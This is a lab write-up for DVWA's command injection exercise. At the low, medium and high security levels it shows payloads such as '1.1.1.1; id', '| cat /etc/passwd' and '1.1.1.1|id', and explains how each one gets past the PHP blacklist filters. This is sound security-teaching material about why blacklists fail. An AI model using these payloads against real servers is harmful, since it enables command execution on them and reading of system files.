# DVWA - Command Injection

## Description

**Vulnerability:** Command injection    
**Impact:** Get access to server resources through `ping` function.

---

## LOW Security Level
This LOW level ping function doesn't have any filter or regex to check the input we enter for them. Therefore, we can leverage this vulnerability to execute additional commands to the server.
Example:
```
1.1.1.1; id
```
This payload will `ping 1.1.1.1` but also run `id`. The result is:
```bash
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
64 bytes from 1.1.1.1: icmp_seq=1 ttl=52 time=63.0 ms
64 bytes from 1.1.1.1: icmp_seq=2 ttl=52 time=93.5 ms
64 bytes from 1.1.1.1: icmp_seq=3 ttl=52 time=76.8 ms
64 bytes from 1.1.1.1: icmp_seq=4 ttl=52 time=50.4 ms

--- 1.1.1.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 50.401/70.910/93.461/16.016 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can see that we are `www-data` since this is the role that host the website. Try payload `1.1.1.1; cat /etc/passwd`. This should be the same `/etc/passwd` content on your computer.

## MEDIUM Security Level
This MEDIUM level has a blacklist:
```php
// Set blacklist
$substitutions = array(
    '&&' => '',
    ';'  => '',
);

// Remove any of the characters in the array (blacklist).
$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
```
This blacklist will prevent us from using the payload in LOW security level. However, instead of `&&` and `;` we can use other keywords which is `|`. The payload is:
```bash
| id

# or 

| cat /etc/passwd
```
It should show the same result as LOW security level.

## HIGH Security Level
This is the new blacklist
```php
// Set blacklist
$substitutions = array(
    '||' => '',
    '&'  => '',
    ';'  => '',
    '| ' => '',
    '-'  => '',
    '$'  => '',
    '('  => '',
    ')'  => '',
    '`'  => '',
);
```
You can see that it prevent a bunch of operators however focus on this line:
```php
'| ' => '',
```
It just blacklist the `'| '` so `'|'` will not be prevented. We can leverage the payload:
```
1.1.1.1|id

1.1.1.1|cat /etc/passwd
```

## Resources
- https://www.scribd.com/doc/2530476/Php-Endangers-Remote-Code-Execution
- http://www.ss64.com/bash/
- http://www.ss64.com/nt/
- https://owasp.org/www-community/attacks/Command_Injection
